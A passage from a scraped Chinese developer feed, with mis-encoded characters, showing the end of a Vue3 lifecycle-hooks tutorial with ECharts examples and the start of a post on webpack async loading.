<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== setup æ‰§è¡Œï¼ˆç­‰ä»·äº beforeCreate + createdï¼‰====='</span>);
<span class="hljs-comment">// å“åº”å¼æ•°æ®åˆå§‹åŒ–</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">// æ¨¡æ‹Ÿæ¥å£è¯·æ±‚ï¼ˆcreated é˜¶æ®µæ ¸å¿ƒåœºæ™¯ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchData</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å‘èµ·å¼‚æ­¥æ¥å£è¯·æ±‚ï¼ˆcreated é˜¶æ®µï¼‰'</span>);
    <span class="hljs-comment">// æ¨¡æ‹Ÿæ¥å£å»¶è¿Ÿ</span>
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>({ <span class="hljs-attr">data</span>: <span class="hljs-string">'æ¨¡æ‹Ÿæ¥å£è¿”å›æ•°æ®'</span> }), <span class="hljs-number">1000</span>);
    });
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ¥å£è¯·æ±‚å®Œæˆï¼š'</span>, res.<span class="hljs-property">data</span>);
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æ¥å£è¯·æ±‚å¤±è´¥ï¼š'</span>, err);
  }
};
<span class="hljs-comment">// æ‰§è¡Œæ¥å£è¯·æ±‚ï¼ˆç­‰ä»·äº created ä¸­è°ƒç”¨ï¼‰</span>
<span class="hljs-title function_">fetchData</span>();

<span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 2. æŒ‚è½½é˜¶æ®µï¼šbeforeMountï¼ˆDOM æœªæŒ‚è½½ï¼‰</span>
<span class="hljs-title function_">onBeforeMount</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== onBeforeMount æ‰§è¡Œ ====='</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'DOM æœªæŒ‚è½½ï¼Œ#chart å…ƒç´ ï¼š'</span>, <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'chart'</span>)); <span class="hljs-comment">// null</span>
  <span class="hljs-comment">// è‹¥éœ€æå‰æ“ä½œ DOMï¼Œéœ€ç»“åˆ nextTick</span>
});

<span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 3. æŒ‚è½½é˜¶æ®µï¼šmountedï¼ˆDOM å·²æŒ‚è½½ï¼Œæ ¸å¿ƒæ“ä½œ DOM åœºæ™¯ï¼‰</span>
<span class="hljs-keyword">let</span> myChart = <span class="hljs-literal">null</span>;
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== onMounted æ‰§è¡Œ ====='</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'DOM å·²æŒ‚è½½ï¼Œ#chart å…ƒç´ ï¼š'</span>, <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'chart'</span>)); <span class="hljs-comment">// å­˜åœ¨</span>
  <span class="hljs-comment">// åˆå§‹åŒ– EChartsï¼ˆä¾èµ– DOM çš„ç¬¬ä¸‰æ–¹åº“ï¼‰</span>
  myChart = echarts.<span class="hljs-title function_">init</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'chart'</span>));
  myChart.<span class="hljs-title function_">setOption</span>({
    <span class="hljs-attr">title</span>: { <span class="hljs-attr">text</span>: <span class="hljs-string">'ç”Ÿå‘½å‘¨æœŸæ¼”ç¤ºå›¾è¡¨'</span> },
    <span class="hljs-attr">xAxis</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'category'</span>, <span class="hljs-attr">data</span>: [<span class="hljs-string">'Mon'</span>, <span class="hljs-string">'Tue'</span>, <span class="hljs-string">'Wed'</span>] },
    <span class="hljs-attr">yAxis</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'value'</span> },
    <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">data</span>: [<span class="hljs-number">120</span>, <span class="hljs-number">200</span>, <span class="hljs-number">150</span>], <span class="hljs-attr">type</span>: <span class="hljs-string">'bar'</span> }]
  });
  <span class="hljs-comment">// æ¨¡æ‹Ÿå®šæ—¶å™¨ï¼ˆéœ€åœ¨å¸è½½é˜¶æ®µæ¸…ç†ï¼‰</span>
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å®šæ—¶å™¨è¿è¡Œä¸­ï¼ˆcountï¼š'</span>, count.<span class="hljs-property">value</span>, <span class="hljs-string">'ï¼‰'</span>);
  }, <span class="hljs-number">1000</span>);
  <span class="hljs-comment">// æŠŠå®šæ—¶å™¨å­˜åˆ°å…¨å±€ï¼Œæ–¹ä¾¿å¸è½½æ—¶æ¸…ç†</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">lifeCycleTimer</span> = timer;
});

<span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 4. æ›´æ–°é˜¶æ®µï¼šbeforeUpdateï¼ˆæ•°æ®æ›´æ–°ï¼ŒDOM æœªé‡æ–°æ¸²æŸ“ï¼‰</span>
<span class="hljs-title function_">onBeforeUpdate</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== onBeforeUpdate æ‰§è¡Œ ====='</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ•°æ®å·²æ›´æ–°ï¼ˆcountï¼š'</span>, count.<span class="hljs-property">value</span>, <span class="hljs-string">'ï¼‰ï¼ŒDOM æœªåˆ·æ–°'</span>);
  <span class="hljs-comment">// å¯è·å–æ›´æ–°å‰çš„ DOM çŠ¶æ€ï¼ˆå¦‚æ—§çš„å›¾è¡¨æ•°æ®ï¼‰</span>
});

<span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 5. æ›´æ–°é˜¶æ®µï¼šupdatedï¼ˆDOM å·²é‡æ–°æ¸²æŸ“ï¼‰</span>
<span class="hljs-title function_">onUpdated</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== onUpdated æ‰§è¡Œ ====='</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'DOM å·²æ›´æ–°ï¼ˆcountï¼š'</span>, count.<span class="hljs-property">value</span>, <span class="hljs-string">'ï¼‰'</span>);
  <span class="hljs-comment">// è‹¥æ•°æ®æ›´æ–°åéœ€é‡æ–°æ¸²æŸ“å›¾è¡¨</span>
  <span class="hljs-keyword">if</span> (myChart) {
    myChart.<span class="hljs-title function_">setOption</span>({
      <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">data</span>: [<span class="hljs-number">120</span> + count.<span class="hljs-property">value</span> * <span class="hljs-number">10</span>, <span class="hljs-number">200</span> + count.<span class="hljs-property">value</span> * <span class="hljs-number">10</span>, <span class="hljs-number">150</span> + count.<span class="hljs-property">value</span> * <span class="hljs-number">10</span>] }]
    });
  }
});

<span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 6. å¸è½½é˜¶æ®µï¼šbeforeUnmountï¼ˆç»„ä»¶å³å°†å¸è½½ï¼Œæ¸…ç†å‰¯ä½œç”¨ï¼‰</span>
<span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== onBeforeUnmount æ‰§è¡Œ ====='</span>);
  <span class="hljs-comment">// æ¸…ç†å®šæ—¶å™¨</span>
  <span class="hljs-built_in">clearInterval</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">lifeCycleTimer</span>);
  <span class="hljs-comment">// é”€æ¯ ECharts å®ä¾‹</span>
  <span class="hljs-keyword">if</span> (myChart) {
    myChart.<span class="hljs-title function_">dispose</span>();
    myChart = <span class="hljs-literal">null</span>;
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å‰¯ä½œç”¨å·²æ¸…ç†ï¼ˆå®šæ—¶å™¨ã€ECharts å·²é”€æ¯ï¼‰'</span>);
});

<span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 7. å¸è½½é˜¶æ®µï¼šunmountedï¼ˆç»„ä»¶å·²å®Œå…¨å¸è½½ï¼‰</span>
<span class="hljs-title function_">unmounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== unmounted æ‰§è¡Œ ====='</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç»„ä»¶å·²å¸è½½ï¼ŒDOM å·²é”€æ¯ï¼Œå®ä¾‹å¤±æ•ˆ'</span>);
});
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-4">å››ã€é€‰é¡¹å¼ API ç¤ºä¾‹ï¼ˆå…¼å®¹ Vue2 å†™æ³•ï¼‰</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"life-cycle-demo"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Vue3 ç”Ÿå‘½å‘¨æœŸæ¼”ç¤ºï¼ˆé€‰é¡¹å¼ APIï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å½“å‰è®¡æ•°ï¼š{{ count }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"count++"</span>&gt;</span>ç‚¹å‡»æ›´æ–°è®¡æ•°<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"chart"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 300px; height: 200px; margin: 20px 0;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> echarts <span class="hljs-keyword">from</span> <span class="hljs-string">'echarts'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-comment">// å“åº”å¼æ•°æ®</span>
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">myChart</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">timer</span>: <span class="hljs-literal">null</span>
    };
  },

  <span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 1. åˆå§‹åŒ–é˜¶æ®µï¼šbeforeCreateï¼ˆå®ä¾‹åˆšåˆ›å»ºï¼Œæ•°æ®/æ–¹æ³•æœªåˆå§‹åŒ–ï¼‰</span>
  <span class="hljs-title function_">beforeCreate</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== beforeCreate æ‰§è¡Œ ====='</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ•°æ®æœªåˆå§‹åŒ–ï¼š'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>); <span class="hljs-comment">// undefined</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ–¹æ³•æœªåˆå§‹åŒ–ï¼š'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">fetchData</span>); <span class="hljs-comment">// undefined</span>
  },

  <span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 2. åˆå§‹åŒ–é˜¶æ®µï¼šcreatedï¼ˆæ•°æ®/æ–¹æ³•å·²åˆå§‹åŒ–ï¼ŒDOM æœªç”Ÿæˆï¼‰</span>
  <span class="hljs-title function_">created</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== created æ‰§è¡Œ ====='</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ•°æ®å·²åˆå§‹åŒ–ï¼š'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>); <span class="hljs-comment">// 0</span>
    <span class="hljs-comment">// å‘èµ·å¼‚æ­¥è¯·æ±‚</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fetchData</span>();
  },

  <span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 3. æŒ‚è½½é˜¶æ®µï¼šbeforeMountï¼ˆæ¨¡æ¿ç¼–è¯‘å®Œæˆï¼ŒDOM æœªæŒ‚è½½ï¼‰</span>
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== beforeMount æ‰§è¡Œ ====='</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'DOM æœªæŒ‚è½½ï¼Œ#chart å…ƒç´ ï¼š'</span>, <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'chart'</span>)); <span class="hljs-comment">// null</span>
  },

  <span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 4. æŒ‚è½½é˜¶æ®µï¼šmountedï¼ˆDOM å·²æŒ‚è½½ï¼Œå¯æ“ä½œçœŸå® DOMï¼‰</span>
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== mounted æ‰§è¡Œ ====='</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'DOM å·²æŒ‚è½½ï¼Œ#chart å…ƒç´ ï¼š'</span>, <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'chart'</span>)); <span class="hljs-comment">// å­˜åœ¨</span>
    <span class="hljs-comment">// åˆå§‹åŒ– ECharts</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">myChart</span> = echarts.<span class="hljs-title function_">init</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'chart'</span>));
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">myChart</span>.<span class="hljs-title function_">setOption</span>({
      <span class="hljs-attr">title</span>: { <span class="hljs-attr">text</span>: <span class="hljs-string">'é€‰é¡¹å¼ API å›¾è¡¨'</span> },
      <span class="hljs-attr">xAxis</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'category'</span>, <span class="hljs-attr">data</span>: [<span class="hljs-string">'Mon'</span>, <span class="hljs-string">'Tue'</span>, <span class="hljs-string">'Wed'</span>] },
      <span class="hljs-attr">yAxis</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'value'</span> },
      <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">data</span>: [<span class="hljs-number">120</span>, <span class="hljs-number">200</span>, <span class="hljs-number">150</span>], <span class="hljs-attr">type</span>: <span class="hljs-string">'bar'</span> }]
    });
    <span class="hljs-comment">// å¯åŠ¨å®šæ—¶å™¨</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å®šæ—¶å™¨è¿è¡Œä¸­ï¼ˆcountï¼š'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>, <span class="hljs-string">'ï¼‰'</span>);
    }, <span class="hljs-number">1000</span>);
  },

  <span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 5. æ›´æ–°é˜¶æ®µï¼šbeforeUpdateï¼ˆæ•°æ®æ›´æ–°ï¼ŒDOM æœªé‡æ–°æ¸²æŸ“ï¼‰</span>
  <span class="hljs-title function_">beforeUpdate</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== beforeUpdate æ‰§è¡Œ ====='</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ•°æ®å·²æ›´æ–°ï¼ˆcountï¼š'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>, <span class="hljs-string">'ï¼‰ï¼ŒDOM æœªåˆ·æ–°'</span>);
  },

  <span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 6. æ›´æ–°é˜¶æ®µï¼šupdatedï¼ˆDOM å·²é‡æ–°æ¸²æŸ“ï¼‰</span>
  <span class="hljs-title function_">updated</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== updated æ‰§è¡Œ ====='</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'DOM å·²æ›´æ–°ï¼ˆcountï¼š'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>, <span class="hljs-string">'ï¼‰'</span>);
    <span class="hljs-comment">// é‡æ–°æ¸²æŸ“å›¾è¡¨</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">myChart</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">myChart</span>.<span class="hljs-title function_">setOption</span>({
        <span class="hljs-attr">series</span>: [{ <span class="hljs-attr">data</span>: [<span class="hljs-number">120</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> * <span class="hljs-number">10</span>, <span class="hljs-number">200</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> * <span class="hljs-number">10</span>, <span class="hljs-number">150</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> * <span class="hljs-number">10</span>] }]
      });
    }
  },

  <span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 7. å¸è½½é˜¶æ®µï¼šbeforeUnmountï¼ˆç»„ä»¶å³å°†å¸è½½ï¼Œæ¸…ç†å‰¯ä½œç”¨ï¼‰</span>
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== beforeUnmount æ‰§è¡Œ ====='</span>);
    <span class="hljs-comment">// æ¸…ç†å®šæ—¶å™¨</span>
    <span class="hljs-built_in">clearInterval</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">timer</span>);
    <span class="hljs-comment">// é”€æ¯ ECharts</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">myChart</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">myChart</span>.<span class="hljs-title function_">dispose</span>();
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">myChart</span> = <span class="hljs-literal">null</span>;
    }
  },

  <span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 8. å¸è½½é˜¶æ®µï¼šunmountedï¼ˆç»„ä»¶å·²å®Œå…¨å¸è½½ï¼‰</span>
  <span class="hljs-title function_">unmounted</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== unmounted æ‰§è¡Œ ====='</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç»„ä»¶å·²å¸è½½ï¼Œèµ„æºå·²æ¸…ç†'</span>);
  },

  <span class="hljs-comment">// è‡ªå®šä¹‰æ–¹æ³•ï¼šæ¨¡æ‹Ÿæ¥å£è¯·æ±‚</span>
  <span class="hljs-attr">methods</span>: {
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å‘èµ·æ¥å£è¯·æ±‚ï¼ˆcreated é˜¶æ®µï¼‰'</span>);
        <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
          <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>({ <span class="hljs-attr">data</span>: <span class="hljs-string">'é€‰é¡¹å¼ API æ¥å£æ•°æ®'</span> }), <span class="hljs-number">1000</span>);
        });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ¥å£è¯·æ±‚å®Œæˆï¼š'</span>, res.<span class="hljs-property">data</span>);
      } <span class="hljs-keyword">catch</span> (err) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æ¥å£è¯·æ±‚å¤±è´¥ï¼š'</span>, err);
      }
    }
  }
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-5">äº”ã€æµ‹è¯•æ–¹å¼ï¼ˆéªŒè¯ç”Ÿå‘½å‘¨æœŸæ‰§è¡Œï¼‰</h3>
<ol>
<li>
<p><strong>æŒ‚è½½é˜¶æ®µ</strong>ï¼šé¡µé¢åŠ è½½åï¼Œæ§åˆ¶å°ä¼šä¾æ¬¡æ‰“å°Â <code>setup</code>/<code>beforeCreate</code>â†’<code>created</code>â†’<code>beforeMount</code>â†’<code>mounted</code>ï¼ŒåŒæ—¶ ECharts å›¾è¡¨æ¸²æŸ“å®Œæˆï¼Œå®šæ—¶å™¨å¼€å§‹è¿è¡Œã€‚</p>
</li>
<li>
<p><strong>æ›´æ–°é˜¶æ®µ</strong>ï¼šç‚¹å‡» â€œç‚¹å‡»æ›´æ–°è®¡æ•°â€ æŒ‰é’®ï¼Œè§¦å‘Â <code>beforeUpdate</code>â†’<code>updated</code>ï¼Œå›¾è¡¨æ•°æ®éšè®¡æ•°æ›´æ–°ã€‚</p>
</li>
<li>
<p><strong>å¸è½½é˜¶æ®µ</strong>ï¼š</p>
<ul>
<li>è‹¥ä½¿ç”¨è·¯ç”±ï¼Œè·³è½¬åˆ°å…¶ä»–é¡µé¢ï¼ˆç»„ä»¶å¸è½½ï¼‰ï¼›</li>
<li>æˆ–æ‰‹åŠ¨ç§»é™¤ç»„ä»¶ï¼ˆå¦‚ç”¨Â <code>v-if</code>Â æ§åˆ¶ï¼‰ï¼Œæ§åˆ¶å°ä¼šæ‰“å°Â <code>beforeUnmount</code>â†’<code>unmounted</code>ï¼Œå®šæ—¶å™¨åœæ­¢ï¼ŒECharts å®ä¾‹é”€æ¯ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-6">å…­ã€æ ¸å¿ƒæ³¨æ„ç‚¹</h3>
<ol>
<li><strong>ç»„åˆå¼ API æ— Â <code>beforeCreate/created</code></strong>ï¼šæ‰€æœ‰åˆå§‹åŒ–é€»è¾‘ç›´æ¥å†™åœ¨Â <code>&lt;script setup&gt;</code>Â é¡¶éƒ¨ï¼Œç­‰ä»·äºè¿™ä¸¤ä¸ªé’©å­ã€‚</li>
<li><strong>å‰¯ä½œç”¨å¿…é¡»æ¸…ç†</strong>ï¼šå®šæ—¶å™¨ã€äº‹ä»¶ç›‘å¬ã€ç¬¬ä¸‰æ–¹åº“å®ä¾‹ï¼ˆå¦‚ EChartsï¼‰éœ€åœ¨Â <code>onBeforeUnmount</code>/<code>beforeUnmount</code>Â ä¸­æ¸…ç†ï¼Œé¿å…å†…å­˜æ³„æ¼ã€‚</li>
<li><strong>DOM æ“ä½œä»…åœ¨Â <code>mounted/updated</code>Â ä¸­å®‰å…¨</strong>ï¼š<code>beforeMount</code>Â ä¸­æ“ä½œ DOM éœ€ç»“åˆÂ <code>nextTick</code>ã€‚</li>
<li><strong>updated ä¸­é¿å…æ— é™å¾ªç¯</strong>ï¼šä¸è¦åœ¨Â <code>updated</code>Â ä¸­ç›´æ¥ä¿®æ”¹å“åº”å¼æ•°æ®ï¼ˆé™¤éåŠ æ¡ä»¶åˆ¤æ–­ï¼‰ã€‚</li>
</ol>
<p>é€šè¿‡è¿™ä¸ªç¤ºä¾‹ï¼Œä½ å¯ä»¥ç›´è§‚çœ‹åˆ°æ¯ä¸ªç”Ÿå‘½å‘¨æœŸé’©å­çš„æ‰§è¡Œæ—¶æœºå’Œå®é™…ç”¨é€”ï¼Œè¦†ç›–æ—¥å¸¸å¼€å‘ä¸­ 90% ä»¥ä¸Šçš„ç”Ÿå‘½å‘¨æœŸåœºæ™¯</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[webpackå¼‚æ­¥åŠ è½½åŸç†æ¢³ç†è§£æ„]]></title>    <link>https://juejin.cn/post/7590128405350875136</link>    <guid>https://juejin.cn/post/7590128405350875136</guid>    <pubDate>2026-01-02T14:03:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590128405350875136" data-draft-id="7589935326782996514" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="webpackå¼‚æ­¥åŠ è½½åŸç†æ¢³ç†è§£æ„"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Webpack"/> <meta itemprop="datePublished" content="2026-01-02T14:03:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sophieæ—­"/> <meta itemprop="url" content="https://juejin.cn/user/2559318799692952"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            webpackå¼‚æ­¥åŠ è½½åŸç†æ¢³ç†è§£æ„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2559318799692952/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sophieæ—­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T14:03:06.000Z" title="Fri Jan 02 2026 14:03:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
